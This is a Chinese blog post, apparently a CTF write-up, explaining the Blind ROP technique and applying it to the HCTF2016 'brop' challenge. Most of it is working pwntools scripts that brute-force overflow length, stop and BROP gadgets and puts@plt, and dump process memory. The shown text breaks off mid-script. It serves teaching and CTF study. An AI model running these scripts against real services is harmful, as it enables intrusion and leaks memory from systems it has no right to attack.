-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/31/BROP/" class="post-title-link" itemprop="url">BROP</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-01-31 13:01:09 / 修改时间：14:55:31" itemprop="dateCreated datePublished" datetime="2022-01-31T13:01:09+08:00">2022-01-31</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>原理在 ctf-wiki 上讲得很清楚了，这里不再重复</p>
-<p>首先需要存在已知如何触发的栈溢出，而且需要远程的进程服务崩溃后不会re-rand</p>
-<p>然后需要爆破出溢出所需的padding大小</p>
-<p>若存在Canary则需要按字节爆破，例如Canary为 0x7766554433221100 ，则从倒数第二个字节开始逐字节爆破，即 padding + 0x0100 ，若Canary报错则说明倒数第二个字节错误，爆破至正确后继续爆破倒数第三个字节直至得到Canary值</p>
-<p>我们需要根据程序的行为来猜测我们寻找的地址应该是什么，为此我们需要先找到 stop gadget</p>
-<h5 id="stop-gadget"><a href="#stop-gadget" class="headerlink" title="stop gadget"></a>stop gadget</h5><p>当我们把返回地址覆盖成我们随意选取的内存地址时，程序会有很大的概率crash，但是也存在一种情况，即当我们控制程序返回到一块内存区域后，程序并没有crash，而是hang在那里，使我们能一直保持连线状态，我们将这种gadget称为 stop gadget 。同样我们需要通过爆破来寻找这样的 stop gadget</p>
-<h5 id="Brop-gadget"><a href="#Brop-gadget" class="headerlink" title="Brop gadget"></a>Brop gadget</h5><p>我们需要将远程服务器dump出程序的内存到本地，为此我们需要一个输出函数，还要能控制对应寄存器的gadget，由于即便找到了 pop;ret 这样的gadget也很难知道其pop的是哪个寄存器，所以我们更倾向于找到__libc_csu_init 中的 pop6_ret（这里称为Brop gadget） 的地址，这样即可准确控制寄存器的值，另外 Brop gadget 往下偏移9即可得到 pop rdi;ret ，同理 Brop gadget 往下偏移7得到 pop rsi;pop r15;ret;</p>
-<h5 id="寻找plt表"><a href="#寻找plt表" class="headerlink" title="寻找plt表"></a>寻找plt表</h5><p>为找到输出函数，我们需要找到plt表，plt表具有比较规整的结构，每一个plt表项都是 16 字节，且每个表项的6字节偏移处，是对该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 进行解析，如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp [&#x27;func&#x27;]	6byte</span><br><span class="line">push index		5byte</span><br><span class="line">jmp dlresolve	5byte</span><br></pre></td></tr></table></figure>
-
-<p>所以 return 到 plt 表项的开头时程序就会调用该函数（无论是否解析过），而 return 到 plt 表项 +6 处，则会再进行一次函数的解析，这也无所谓，因为最终同样会调用该函数。</p>
-<p>当我们发现好多条连续16个字节对齐的地址都不会造成crash，而且这些地址+6的地址同样不会造成crash，那么我们有理由相信这就是某个plt对应的表项</p>
-<p>所以我们可以通过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + canary + p64(pop_rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)</span><br></pre></td></tr></table></figure>
-
-<p>这样的payload来判断 addr 是不是 puts@plt（在程序未开PIE的情况下，0x400000 是 ELF 文件的头部，其内容为“\7fELF”。</p>
-<p>同理我们可以通过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + canary + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(0x400000) + p64(stop_gadget)</span><br></pre></td></tr></table></figure>
-
-<p>这样的payload来判断 addr 是不是 write@plt ，虽然这里没有控制 rdx，但调用函数时rdx经常性不为0，所以这种办法也存在可行性。如果要控制 rdx 的话我们可以试着寻找程序中有无 strcmp 及其系列函数存在，达到通过调用这样的函数来控制 rdx 。</p>
-<h5 id="dump远程"><a href="#dump远程" class="headerlink" title="dump远程"></a>dump远程</h5><p>利用 plt 表中的 puts 函数，配合 useful gadget，来 dump 远程信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + canary + p64(pop_rdi_ret) + p64(target) + p64(puts) + p64(stop_gadget)</span><br></pre></td></tr></table></figure>
-
-<p>重复执行如上payload来讲远程的内存信息打印保存在本地，但是一次最多只能dump一个内存页的大小，也就是0x1000个字节</p>
-<h5 id="脚本部分"><a href="#脚本部分" class="headerlink" title="脚本部分"></a>脚本部分</h5><p>获取padding大小的部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_overflow_length</span>():</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">&#x27;a&#x27;</span>*i)</span><br><span class="line">            content = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;回显的内容&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">length = find_overflow_length()</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Force_find_padding</span>():</span></span><br><span class="line">    padding_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            padding_length=padding_length+<span class="number">1</span></span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;回显的内容&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> p.recvall():</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">&quot;Programe not exit normally!&quot;</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.success(<span class="string">&quot;The true padding length is &quot;</span>+<span class="built_in">str</span>(padding_length-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> padding_length</span><br><span class="line">    log.error(<span class="string">&quot;We don&#x27;t find true padding length!&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding_length=null</span><br><span class="line"><span class="keyword">if</span> padding_length <span class="keyword">is</span> null:</span><br><span class="line">    padding_length=Force_find_padding()</span><br></pre></td></tr></table></figure>
-
-<p>记录获取的地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in_file</span>(<span class="params">addr</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;puts.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;the addr:0x%x\n&quot;</span>%addr)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
-
-<p>获取 stop gadget 的部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_stop_gadget</span>(<span class="params">length</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout = <span class="number">0.2</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;回显的内容&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;one_stop_gadget is at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                log_in_file(addr)  </span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>获取 Brop gadget 的部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Brop_gadget</span>(<span class="params">length,stop_gadget_addr,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget_addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;回显的内容&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
-
-<p>检查 Brop gadget 的部分（防止addr本身是 stop_gadget）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_Brop_gadget</span>(<span class="params">length,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;回显的内容&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
-
-<p>结合上述两个部分得到 Brop gadget（一般可以不从0x400000开始）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_Brop_gadget</span>(<span class="params">length,stop_gadget_addr</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">if</span>(get_Brop_gadget(length,stop_gadget_addr,addr)):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;possible Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">            <span class="keyword">if</span>(check_Brop_gadget(length,addr)):</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;success Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>获取 puts@plt 的部分（用这个脚本跑出来的地址好像需要 +10 个字节才是正确的地址，自行测试。同时如果将初始的addr设置的太大的话可能会跑出 call puts 指令的地址）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_puts_plt</span>(<span class="params">length,pop_rdi_ret</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(<span class="number">0</span>)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\x7fELF&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;We found puts_plt at: &quot;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>泄露部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">length,stop_gadget_addr,pop_rdi_ret,puts_plt,addr</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(stop_gadget_addr)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = content[:content.index(<span class="string">&quot;\n回显的内容&quot;</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = content</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakfunction</span>(<span class="params">length,stop_gadget_addr,pop_rdi_ret,puts_plt</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        data = leak(length,stop_gadget_addr,pop_rdi_ret,puts_plt,addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        f.write(result)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
-
-<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>以 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop">HCTF2016 的出题人失踪了</a> 为例，因为自己没搭远程环境，所以打本地</p>
-<p>按着上述思路确定步骤：</p>
-<ol>
-<li>确定漏洞是否为栈溢出，如果有则爆破出长度</li>
-<li>判断有无Canary，如果有则爆破出Canary</li>
-<li>找到 stop gadget</li>
-<li>找到 Brop gadget</li>
-<li>找到输出函数的 plt 地址</li>
-<li>利用输出函数 dump 出程序内存</li>
-<li>利用 dump 出的内存找到输出函数的got表地址</li>
-<li>常规 ret2libc</li>
-</ol>
-<p>我们打开程序试着输入，查看正常的回显以及判断是否有栈溢出</p>
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-1.png" class>
-
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-2.jpg" class>
-
-<p>所以用以下脚本跑出溢出长度 length</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_overflow_length</span>():</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">&#x27;a&#x27;</span>*i)</span><br><span class="line">            content = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;No password, no game&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">length = find_overflow_length()</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0get_length.jpg" class>
-
-<p>以下脚本跑出 stop gadget</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_stop_gadget</span>(<span class="params">length</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout = <span class="number">0.2</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;WelCome my friend,Do you know password?&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;one_stop_gadget is at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                log_in_file(addr)  </span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in_file</span>(<span class="params">addr</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;puts.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;the addr:0x%x\n&quot;</span>%addr)</span><br><span class="line">    f.close()</span><br><span class="line">    </span><br><span class="line">find_stop_gadget(<span class="number">72</span>)</span><br></pre></td></tr></table></figure>
-
-<p>注意这里我们将回显的内容设置成了程序一开始显示的内容，因为我们可以选择将能返回到main函数（或者说出现最开始的回显的函数，这里我们当作是main函数出现的回显）的地址作为 stop gadget，这其中可能包含了 main 函数的地址或 start 函数的地址等，程序返回到main函数的话因为程序会等待我们的输入，所以程序会hang在那里，达到 stop gadget 的预期作用。跑完我们得到如下地址：</p>
-<img src="/2022/01/31/BROP/%E2%91%A0get_stop_gadget.jpg" class>
-
-<p>我们随便找个地址进行测试，看看程序是否会返回到main函数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*length + p64(<span class="number">0x4005cf</span>)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-3.jpg" class>
-
-<p>看到这个地址成功的让我们返回到main函数并让程序不终止，我们选择其作为 stop gadget（其实为了防止出现特殊情况，最好选择正常一点的地址）</p>
-<p>接下来跑出 Brop gadget</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Brop_gadget</span>(<span class="params">length,stop_gadget_addr,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget_addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;WelCome my friend,Do you know password?&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_Brop_gadget</span>(<span class="params">length,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;WelCome my friend,Do you know password?&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span 